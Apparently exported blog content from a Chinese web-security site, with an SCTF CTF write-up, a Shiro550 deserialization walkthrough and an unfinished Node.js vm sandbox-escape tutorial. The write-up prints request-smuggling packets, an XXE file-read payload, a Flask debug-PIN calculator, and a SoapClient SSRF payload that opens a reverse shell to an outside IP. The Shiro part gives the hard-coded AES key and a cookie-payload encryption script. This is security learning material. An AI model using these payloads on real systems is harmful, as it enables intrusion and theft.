原型链污染_-栀蓝-的博客-CSDN博客\nFuzz中的javascript大小写特性 | 离别歌 (leavesongs.com)\n Web/Nodejs]原型链污染EJS模块的利用分析(附源码分析)_車鈊的博客-CSDN博客\nhttps://xz.aliyun.com/t/6113#toc-4\n","categories":["WebSec"],"tags":["原型链污染"]},{"title":"SCTF-Web复现","url":"/2023/06/25/SCTF-Web%E5%A4%8D%E7%8E%B0/","content":"SCTF-Web复现ezcheck1n赛题评价：这不好说，很难评\n题目代码逻辑如下，主要逻辑是从参数中获取url参数，然后把flag变量拼接到url后面，之后发过去，其实就是个外带回显\n&lt;?php$FLAG = \"flag{fake_flag}\";@file_get_contents(\"http://\".$_GET['url'].$FLAG);# but it's not the real flag# beacuse someone say this year is not 2023 !!! like the post?show_source('./2023.php');$a = file_get_contents('./post.jpeg');echo '&lt;img src=\"data:image/jpeg;base64,' . base64_encode($a) . '\"&gt;';# notice -&gt; time# How should you get to where the flag is, the middleware will not forward requests that are not 2023?&gt;\n\n尝试一下：\n\nroot@VM-24-4-ubuntu:~# nc -lvnp 7777Listening on 0.0.0.0 7777Connection received on 115.239.215.75 54096GET /flag{fake_flag} HTTP/1.0Host: 43.143.246.73:7777Connection: close\n\n这里有两个地方很奇怪，一个是传参的时候，用?url=xxxx:xxxx/这种形式传递是不行的，还有就是我并没有在2023.php下进行参数传递也可以通，其实这两个问题都是一个原因，就是apache的Rewrite规则，相信如果了解过apache-Rewrite的师傅肯定不陌生，它采用的是正则匹配的方式，随便一猜也可以猜的出来匹配的是/2023/（正则内容），然后将正则内容作为参数转交给其他逻辑（2023.php）处理。所以此时我们可以理解成在url前面已经有一个默认的参数了，就不能用?进行传参，而是用&amp;拼接第二个参数，所以其实这样传也是可以的（这里我可能理解的不够深，如果有师傅有其他理解也吗麻烦指正一下）：\n然后f12在相应header中可以看到apache的版本是2.5.4，这个版本的apche存在走私漏洞，说白了就是可以在一次请求中发送多个数据包请求，参考文章如下：https://forum.butian.net/share/2180：\n然后就到了这道题最抽象的地方，就是对出题人的脑洞，这些提示其实就是告诉我们中间件能解析的请求是2023的，但是真正的flag却不在2023中，谜语翻译过来就是要用走私构造一个2023的数据包来绕过中间件，然后再构造一个访问2022.php的数据包拿到flag：\n# but it's not the real flag# beacuse someone say this year is not 2023 !!! like the post?show_source('./2023.php');# notice -&gt; time# How should you get to where the flag is, the middleware will not forward requests that are not 2023\n\n然后这里赛后又复现了一遍，貌似是环境寄了，拿当时比赛时打通的payload和各种其他师傅的payload全是超时，数据包大概就这么构造：\nburp随便抓个包存到pre.txt中，然后写个脚本把里面空格替换成%20，换行替换成%0d%0a：\nimport oshttptext = \"\"f = open('pre.txt', 'r')#### 读取文件内容，将每一行中的空格替换为%20 ####for line in f.readlines():    line = line.replace(' ', '%20')    # print(line)    #### 将每一行的\\n替换为%0d%0a ####    #### 并存储到httptext中 ####    httptext = httptext + line.replace('\\n', '%0d%0a')f.close()httptext = httptext + \"\"print(httptext)\n\n之后再构造出第二个数据包就行了，然后第二个数据包访问的路由和参数是2022.php?url=vpsip:port/，然后两个数据包之间用%0d%0a%0d%0a进行拼接就可以了，最后构造好的包文是这样的（比赛时打通的）：\nGET /2023/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d43.143.246.73%3a7777 HTTP/1.1Host: 115.239.215.75:8082Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://115.239.215.75:8082/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close\n\n\npypyp?赛题评价：同上一题\n先来点小脑洞，进入环境之后说没有Session，这里是php的Session，可能很多人会误解成Python的Session，然后可以利用PHP_SESSION_UPLOAD_PROGRESS在客户端强行创建一个Session，并且session.upload_progress.name这个属性（Session全局数组中的key）是可控的，我们可以通过POST一个恶意的PHP_SESSION_UPLOAD_PROGRESS字段，并且这个字段的Value就是这个session.upload_progress.name。\n\nSession Upload Progress 最初是PHP为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在Session中，此时即使用户没有初始化Session，PHP也会自动初始化Session。而且，默认情况下session.upload_progress.enabled是为On的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化Session。\n\n从上面官方给出的定义中可以知道PHP_SESSION_UPLOAD_PROGRESS是一个用来统计文件上传进度的Session，所以我们可以写一个表单，POST一个PHP_SESSION_UPLOAD_PROGRESS字段，并加入一个文件上传，就可以获取到伪造的表单提交包文了：\n&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=\"http://xxxxx/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt;    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"123\" /&gt;    &lt;input type=\"file\" name=\"file\" /&gt;    &lt;input type=\"submit\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n上传文件并抓包可以拿到这样的包文：\n\n改造题目环境的包文，绕过第一关：\n\n拿到题目源码如下：\n&lt;?php    error_reporting(0);    if(!isset($_SESSION)){        die('Session not started');    }    highlight_file(__FILE__);    $type = $_SESSION['type'];    $properties = $_SESSION['properties'];    echo urlencode($_POST['data']);    extract(unserialize($_POST['data']));    if(is_string($properties)&amp;&amp;unserialize(urldecode($properties))){    $object = unserialize(urldecode($properties));    $object -&gt; sctf();    exit();    } else if(is_array($properties)){        $object = new $type($properties[0],$properties[1]);    } else {        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);    }    echo \"this is the object: $object &lt;br&gt;\";?&gt;\n\n先看第一部分，有个变量覆盖  extract(unserialize($_POST['data']));，也就是说我们可以通过传入一个数组来覆盖上面$type和$properties的值，再往下看发现有一个判断：\nif(is_array($properties)){        $object = new $type($properties[0],$properties[1]);    }\n\n如果$properties是一个数组，就new一个$type对象，并且传入参数为$properties[0],$properties[1]，那么我们可以让$type为SimpleXMLElement这个原生类，这个原生类可以解析一个XML文档，并且初始化时参数如下，需要注意的是第三个参数data_is_url，默认为false，也就是第一个参数data需要传入一个xml：\n这样的话我们就可以构造出一个payload，从而实现XXE，这样我们就实现了任意文件读取：\n&lt;?php$pro = array('&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;',2);$arr = array(\"properties\"=&gt;$pro,\"type\"=&gt;SimpleXMLElement);// print_r($arr);print_r(serialize($arr));\n\n\n再看else的部分，如果$properties不是数组，就会访问远程的一个服务，题目提示了/app/app.py，我们这里xxe看一下代码：    \nif(is_array($properties)){        $object = new $type($properties[0],$properties[1]);    } else {        $object = file_get_contents('http://127.0.0.1:5000/'.$properties);    }\n\n发现Flask服务开启了debug，算pin码就可以了：\n\n放个算pin码的脚本，还能顺带算出cookie，方便后面直接用：\n项目地址：https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code/blob/main/get_flask_pin_and_cookie.py\n#!/usr/bin/python3# Tested on Python3.8# This script generates a Cookie based on a legitimate PIN code.# If you are using a Python version lower than 3.8 and you were unable to generate a Cookie or PIN, use the script at the link below.# It is based on the following script, which generates only the PIN code:# https://gist.githubusercontent.com/InfoSecJack/70033ecb7dde4195661a1f6ed7990d42/raw/028384ef695e376d412f9276ad27b2c916d4f748/get_flask_pin.py# In different versions of python, the hashing algorithm may differ, in this case, sha1 is used.# There may also be other differences.import argparseimport osimport getpassimport sysimport hashlibimport timeimport uuidfrom itertools import chaintext_type = strdef hash_pin(pin: str) -&gt; str:    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]def get_pin(args):    rv = None    num = None    username = args.username    modname = args.modname    appname = args.appname    fname = args.basefile    probably_public_bits = [username, modname, appname, fname]    private_bits = [args.uuid, args.machineid]    h = hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, text_type):            bit = bit.encode('utf-8')        h.update(bit)    h.update(b'cookiesalt')    cookie_name = '__wzd' + h.hexdigest()[:20]    # If we need to generate a pin we salt it a bit more so that we don't    # end up with the same value and generate out 9 digits    if num is None:        h.update(b'pinsalt')        num = ('%09d' % int(h.hexdigest(), 16))[:9]    # Format the pincode in groups of digits for easier remembering if    # we don't have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                              for x in range(0, len(num), group_size))                break        else:            rv = num    hash_pin(rv)    print(\"Cookie: \", cookie_name + \"=\" + str(int(time.time())) + '|' + hash_pin(rv))    return rvif __name__ == \"__main__\":    versions = [\"2.7\", \"3.0\", \"3.1\", \"3.2\", \"3.3\", \"3.4\", \"3.5\", \"3.6\", \"3.7\", \"3.8\"]    parser = argparse.ArgumentParser(description=\"tool to get the flask debug pin from system information\")    parser.add_argument(\"--username\", required=False, default=\"www-data\",                        help=\"The username of the user running the web server\")    parser.add_argument(\"--modname\", required=False, default=\"flask.app\",                        help=\"The module name (app.__module__ or app.__class__.__module__)\")    parser.add_argument(\"--appname\", required=False, default=\"Flask\",                        help=\"The app name (app.__name__ or app.__class__.__name__)\")    parser.add_argument(\"--basefile\", required=False,                        help=\"The filename to the base app.py file (getattr(sys.modules.get(modname), '__file__', None))\")    parser.add_argument(\"--uuid\", required=True,                        help=\"System network interface UUID (/sys/class/net/ens33/address or /sys/class/net/$interface/address)\")    parser.add_argument(\"--machineid\", required=True,                        help=\"System machine ID (非docker环境：/etc/machine-id  docker环境： /proc/sys/kernel/random/boot_id+/proc/self/cgroup)\")    args = parser.parse_args()    if args.basefile is None:        print(\"[!] App.py base path not provided, trying for most versions of python\\n\")        for v in versions:            args.basefile = f\"/usr/local/lib/python{v}/dist-packages/flask/app.py\"            print(f\"PIN Python {v}: {get_pin(args)}\\n\")    else:        print(\"PIN: \", get_pin(args))\n\n其中需要获取的参数的方法如下：\n\nusername：通过查看/etc/passwd可以看到全部的用户，有一个叫做app的，是这个用户\n\nmodename：默认值为flask.app，不需要改\n\nappname：默认值为Flask，不需要改\n\nbasefile：app.py的存放位置，这里可以猜，大部分默认都是/usr/lib/python3.x/site-packages/flask/app.py，这里python版本是3.8（猜的），也可以通过FileSystemIterator这个原生类来看一下具体的版本：\n\n\nuuid：一般读取这个文件：/sys/class/net/eth0/address的十进制\n\nmachineid：题目是docker环境，所以是/proc/sys/kernel/random/boot_id后拼接/proc/sys/kernel/random/boot_id+/proc/self/cgroup的docker部分\n\n\n算出pin码和cookie为：\n\n然后就可以进入console中执行命令了，我们可以本地起一个Flask进入到调试模式中执行命令看看传参是什么样的：\n\n抓一下输入pin码时的包：\n\n再抓一个console中执行命令时的包（这里就会发现执行命令时是需要Cookie的，这时候之前算好的Cookie就派上用场了），然后这里发现参数是需要传入一个s的，也就是Flask服务的SecretKey，我们去访问题目环境的console路由就可以看到：\n\n然后就可以构造RCE的数据包了，我们现在有RCE所需的参数，然后考虑是否可以通过这里传参从而RCE，答案是不行的，因为Cookie没办法传过去：\n$object = file_get_contents('http://127.0.0.1:5000/'.$properties);\n\n所以我们又要通过一个原生类来构造SSRF，从而访问5000端口的这个Flask服务了，用到的是SoapClient这个原生类，可以理解成直接对target发起一次请求：\n\nSoapClient {    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed\n\n可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n该类的构造函数如下：\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n\n\n第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。\n第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n\n看到这段代码：\nif(is_string($properties)&amp;&amp;unserialize(urldecode($properties))){$object = unserialize(urldecode($properties));$object -&gt; sctf();\n\n可以看到$object调用了sctf()这个方法，其实就是调用_call然后打SSRF\n构造出如下payload：\n&lt;?php$sop = new SoapClient(null,array('user_agent'=&gt;\"test\\r\\nCookie: __wzdb2a60e2b19822632a67c=1687701860|11b8517fb9fb\",'location'=&gt;'http://127.0.0.1:5000/console?__debugger__=yes&amp;cmd=__import__(\"os\").popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20/dev/tcp/43.143.246.73/7777%200%3E%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9','uri'=&gt;'test'));$arr = array(\"properties\"=&gt;urlencode(serialize($sop)));$b = serialize($arr);echo $b;\n\n拿到shell后直接suid提权就可以读取flag\n\n\n","categories":["CTF"],"tags":["SCTF"]},{"title":"Shiro550","url":"/2023/06/08/Shiro550/","content":"Shiro550反序列化环境配置\n代码准备，需要1.2.4版本的shiro代码来运行：\ngit clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4\n修改maven依赖：在项目根目录的pom.xml下修改jstl依赖项为\n\n\n&lt;dependency&gt;            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;            &lt;version&gt;2.5&lt;/version&gt;            &lt;scope&gt;provided&lt;/scope&gt;        &lt;/dependency&gt;\n\n\njdk及tomcat版本选用：\njdk选用1.7：Java Archive Downloads - Java SE 7 (oracle.com)\ntomcat选用8.x：Apache Tomcat® - Apache Tomcat 8 Software Downloads\n\nidea中配置tomcat并运行shiro项目：\n等待maven依赖导入完成后就可以配置tomcat了，一部分maven依赖可能无法导入，但不影响项目正常启动。\ntomcat的配置，此外也要对项目工程及sdk和java编译版本选择为1.7，这里要将HTTP port改为其他端口，因为一会我们需要用burpsuite抓包，burpsuite默认端口也是8080，会造成端口冲突：\n\n\n成功启动后如下：\n\n\n\n\nURLDNS探测Shiro550我们在搭建好的网站上进行登陆，并且要勾选Rememberme后抓包，可以发现在Server端返回的Cookie中有一个rememberMe字段，并且其中看起来像是加密储存了一些内容：    \n我们可以在shiro的源码中发现实现这个功能的类CookieRememberMeManager，找到其中的getRememberedSerializedIdentity这个方法，可以看的出来这个方法会从请求中获取这个Cookie并返回，所以接下来的逻辑就是找哪个方法调用了这个方法，然后对Cookie进行解密等处理：\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {      if (!WebUtils.isHttp(subjectContext)) {          if (log.isDebugEnabled()) {              String msg = \"SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a \" +                      \"servlet request and response in order to retrieve the rememberMe cookie. Returning \" +                      \"immediately and ignoring rememberMe operation.\";              log.debug(msg);          }          return null;      }      WebSubjectContext wsc = (WebSubjectContext) subjectContext;      if (isIdentityRemoved(wsc)) {          return null;      }      HttpServletRequest request = WebUtils.getHttpRequest(wsc);      HttpServletResponse response = WebUtils.getHttpResponse(wsc);      String base64 = getCookie().readValue(request, response);      // Browsers do not always remove cookies immediately (SHIRO-183)      // ignore cookies that are scheduled for removal      if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;      if (base64 != null) {          base64 = ensurePadding(base64);          if (log.isTraceEnabled()) {              log.trace(\"Acquired Base64 encoded identity [\" + base64 + \"]\");          }          byte[] decoded = Base64.decode(base64);          if (log.isTraceEnabled()) {              log.trace(\"Base64 decoded byte array length: \" + (decoded != null ? decoded.length : 0) + \" bytes.\");          }          return decoded;      } else {          //no cookie set - new site visitor?          return null;      }  }\n\n在org/apache/shiro/mgt/AbstractRememberMeManager这个类中我们找到了getRememberedPrincipals这个方法调用了getRememberedSerializedIdentity，然后把这个Cookie用convertBytesToPrincipals进行处理，我们跟进这个方法：\npublic PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {    PrincipalCollection principals = null;    try {        byte[] bytes = getRememberedSerializedIdentity(subjectContext);        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:        if (bytes != null &amp;&amp; bytes.length &gt; 0) {            principals = convertBytesToPrincipals(bytes, subjectContext);        }    } catch (RuntimeException re) {        principals = onRememberedPrincipalFailure(re, subjectContext);    }    return principals;}\n\n可以看到这个方法做了两件事，一个是对这个传过来的Cookie进行decrypt（解密），一个是对这个Cookie进行deserialize（反序列化），我们分别跟进这两个方法看一下：\nprotected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {    if (getCipherService() != null) {        bytes = decrypt(bytes);    }    return deserialize(bytes);}\n\n先来看deserialize：\nprotected PrincipalCollection deserialize(byte[] serializedIdentity) {    return getSerializer().deserialize(serializedIdentity);}\n\n这个函数把Cookie传给了getSerializer().deserialize()这个方法，getSerializer的返回值是serializer，这个变量在构造函数内进行了初始化，是一个DefaultSerializer，因此我们跟进DefaultSerializer.deserialize\n    public Serializer&lt;PrincipalCollection&gt; getSerializer() {        return serializer;    }## 构造函数public AbstractRememberMeManager() {        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    }\n\n可以发现就是实现了一个反序列化，因此确实存在反序列化漏洞的点，我们接下来就要破解上面的加密算法，从而能让我们自己的payload加密后发过去：\npublic T deserialize(byte[] serialized) throws SerializationException {    if (serialized == null) {        String msg = \"argument cannot be null.\";        throw new IllegalArgumentException(msg);    }    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);    BufferedInputStream bis = new BufferedInputStream(bais);    try {        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);        @SuppressWarnings({\"unchecked\"})        T deserialized = (T) ois.readObject();        ois.close();        return deserialized;    } catch (Exception e) {        String msg = \"Unable to deserialze argument byte array.\";        throw new SerializationException(msg, e);    }}\n\n回到decrypt上，decrypt方法先通过getDecryptionCipherKey方法获取了一个密钥，然后将Cookie交给cipherService.decrypt方法解密：\nprotected byte[] decrypt(byte[] encrypted) {     byte[] serialized = encrypted;     CipherService cipherService = getCipherService();     if (cipherService != null) {         ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());         serialized = byteSource.getBytes();     }     return serialized; }\n\n可以看到cipherService是通过getCipherService方法得到的，跟进发现返回值在构造函数中初始化，其实到这里可以看的出来就是个Aes加密了（并且下面的setCipherKey其实就是AES的密钥，不过我们假装不知道一会再找回来），继续跟进AesCipherService的话可以看到Aes加密的具体方式，这里就不展示出来了：\npublic AbstractRememberMeManager() {    this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();    this.cipherService = new AesCipherService();    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);}\n\n我们再回头看getDecryptionCipherKey方法获取密钥的逻辑，跟进：\npublic byte[] getDecryptionCipherKey() {    return decryptionCipherKey;}\n\n再找decryptionCipherKey这个属性在哪里进行的赋值，可以发现是通过setter赋值（Find Usage -&gt; Value Write）：\npublic void setDecryptionCipherKey(byte[] decryptionCipherKey) {     this.decryptionCipherKey = decryptionCipherKey; }\n\n接着看哪里调用了setDecryptionCipherKey方法，发现在setCipherKey方法中：\npublic void setCipherKey(byte[] cipherKey) {    //Since this method should only be used in symmetric ciphers    //(where the enc and dec keys are the same), set it on both:    setEncryptionCipherKey(cipherKey);    setDecryptionCipherKey(cipherKey);}\n\n最终其实还是在构造函数传了密钥，并且可以发现密钥是一个写死的常量，因此问题就出在这里，在shiro1.2.4版本下，密钥是写死的，并且采用的是AES加密（对称加密），所以我们可以通过这个密钥自己构造payload并加密后传过去进行反序列化攻击：\npublic AbstractRememberMeManager() {        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();        this.cipherService = new AesCipherService();        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);    } private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\");\n\n\n我们看一下在这个包中的Maven依赖有哪个是我们可攻击的，发现存在commons-collections3.x，不过可以发现这个依赖项的scope是test，也就是说只有在test中运行时这个依赖才会被导入，那么真实条件下是不存在这个依赖的，所以我们是没有办法通过这个依赖进行攻击的：\n\n实际上可以攻击的依赖是commons-beanutils这个依赖，不过我们这里先用Java自带的URLDNS进行一下测试\n\n\n将URLDNS的利用类序列化出来，我这里序列化后保存的文件名叫做ser.bin：\npackage ysoserial.payloads.util.Test;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;import static ysoserial.payloads.util.Test.util.Serialize.serialize;import static ysoserial.payloads.util.Test.util.Unserialize.unserialize;public class URLDNSTest{    public static void main(String[] args) throws Exception{      // url为接收dns请求的url 自己修改        URL url = new URL(\"xxx.com\");        Class c = url.getClass();        Field hashcodeField = c.getDeclaredField(\"hashCode\");        hashcodeField.setAccessible(true);        hashcodeField.set(url,1234);        HashMap hashMap = new HashMap();        hashMap.put(url,1);        hashcodeField.set(url,-1);        serialize(hashMap);    }}\n\n这是根据shiro加密的逻辑写出的构造新payload的脚本：\nimport base64import uuidfrom random import Randomfrom Crypto.Cipher import AESdef get_file_data(filename):    with open(filename, 'rb') as f:        data = f.read()    return datadef aes_enc(data):     BS = AES.block_size     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()     key = \"kPH+bIxk5D2deZiIxcaaaA==\"     mode = AES.MODE_CBC     iv = uuid.uuid4().bytes     encryptor = AES.new(base64.b64decode(key), mode, iv)     ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))     return ciphertextdef aes_dec(enc_data):    enc_data = base64.b64decode(enc_data)    unpad = lambda s : s[:-s[-1]]    key = \"kPH+bIxk5D2deZiIxcaaaA==\"    mode = AES.MODE_CBC    iv = enc_data[:16]    encryptor = AES.new(base64.b64decode(key), mode, iv)    plaintext = encryptor.decrypt(enc_data[16:])    plaintext = unpad(plaintext)    return plaintextif __name__ == '__main__':    data = get_file_data(\"ser.bin\")    print(aes_enc(data))\n\n把ser.bin和脚本放在同一目录下运行脚本即可：\n\n\n替换Cookie进行发包，需要注意的是要将Cookie中的SessionId删除掉，否则Shiro会直接用Sessionid而不是rememberme：\n\n关于如何通过cb链命令执行先🐦一手 有空补上来\n","categories":["WebSec"],"tags":["Shiro550反序列化"]},{"title":"VM沙箱逃逸","url":"/2023/04/20/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","content":"参考文章：https://blog.csdn.net/m0_62063669/article/details/125441529\n​                    https://blog.csdn.net/u012961419/article/details/121281538\n​                    https://blog.csdn.net/sunyctf/article/details/124434565\n​                    https://www.mianshigee.com/note/detail/27897wlr/#script-runinnewcontext-sandbox-options\n​                    https://blog.csdn.net/shawdow_bug/article/details/120072209?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-120072209-blog-119792059.pc_relevant_3mothn_strategy_and_data_recovery&amp;utm_relevant_index=2\nProxy 和 Reflect - 掘金 (juejin.cn)\nvm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)\n​                    P神知识星球\n​                    \n0x01 沙箱逃逸初识说到沙箱逃逸，我们先来明确一些基本的概念。\n\nJavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫叫做Nodejs。\n什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。\n沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。\n在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。\n\n0x02 Node将字符串执行为代码我们先来看两个在node中将把字符串执行成代码的方式。\n方法一 eval\n首先我在目录下创建一个age.txt\nvar age = 18\n\n创建一个y1.js\nconst fs = require('fs')let content = fs.readFileSync('age.txt', 'utf-8')console.log(content)eval(content)console.log(age)\n\n\n可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。\n\n在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。\n方法二：new Function\n上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new Function的第一个参数是形参名称，第二个参数是函数体。\n\n我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。\n从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域，这也就是vm模块的作用。\n0x03 Nodejs作用域说到作用域，我们就要说一下Node中的作用域是怎么分配的（在Node中一般把作用域叫上下文）。\n在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象window，那么在服务端发挥作用的Node它的构造和JavaScript不太一样。\n我们在写一个Node项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。\n在同一级目录下有y1.js和y2.js两个文件\ny1.js\nvar age = 20\n\ny2.js\nconst a = require(\"./y1\")console.log(a.age)\n\n运行y2.js发现报错 age 值为undefined\n\n那么我们想y2中引入并使用y1中的元素应该怎么办呢，Node给我们提供了一个将js文件中元素输出的接口exports ，把y1修改成下面这样：\ny1.js\nvar age = 20exports.age = age\n\n我们再运行y2就可以拿到age的值了\n\n我们用图来解释这两个包之间的关系就是\n\n这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。\n刚才我们提到在JavaScript中window是全局对象，浏览器其他所有的属性都挂载在window下，那么在服务端的Nodejs中和window类似的全局对象叫做global，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用global.xxx的方式来访问，直接用xxx就可以调用这个变量。举个例子，console就是挂载在global下的一个全局变量，我们在用console.log输出时并不需要写成global.console.log，其他常见全局变量还有process（一会逃逸要用到）。\n我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：\ny1.js\nglobal.age = 20\n\n y2.js\nconst a = require(\"./y1\")console.log(age)\n\n输出：\n\n可以发现我这次在y1中并没有使用exports将age导入，并且y2在输出时也没有用a.age，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。\n我们输出一下global对象，可以看到age确实挂载在了global上：\n&lt;ref *1&gt; Object [global] {  global: [Circular *1],  clearInterval: [Function: clearInterval],  clearTimeout: [Function: clearTimeout],  setInterval: [Function: setInterval],  setTimeout: [Function: setTimeout] {    [Symbol(nodejs.util.promisify.custom)]: [Getter]  },  queueMicrotask: [Function: queueMicrotask],  performance: Performance {    nodeTiming: PerformanceNodeTiming {      name: 'node',      entryType: 'node',      startTime: 0,      duration: 25.98190000653267,      nodeStart: 0.4919999986886978,      v8Start: 2.0012000054121017,      bootstrapComplete: 18.864999994635582,      environment: 10.277099996805191,      loopStart: -1,      loopExit: -1,      idleTime: 0    },    timeOrigin: 1665558311872.296  },  clearImmediate: [Function: clearImmediate],  setImmediate: [Function: setImmediate] {    [Symbol(nodejs.util.promisify.custom)]: [Getter]  },  age: 20}\n\n\n\n0x04 vm沙箱逃逸我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。\n\nvm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。\n\n\n\nconst vm = require('vm');let localVar = 'initial value';const vmResult = vm.runInThisContext('localVar = \"vm\";');console.log('vmResult:', vmResult);console.log('localVar:', localVar);// vmResult: 'vm', localVar: 'initial value'\n\n\nvm.createContext([sandbox])： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。\nvm.runInContext(code, contextifiedSandbox[, 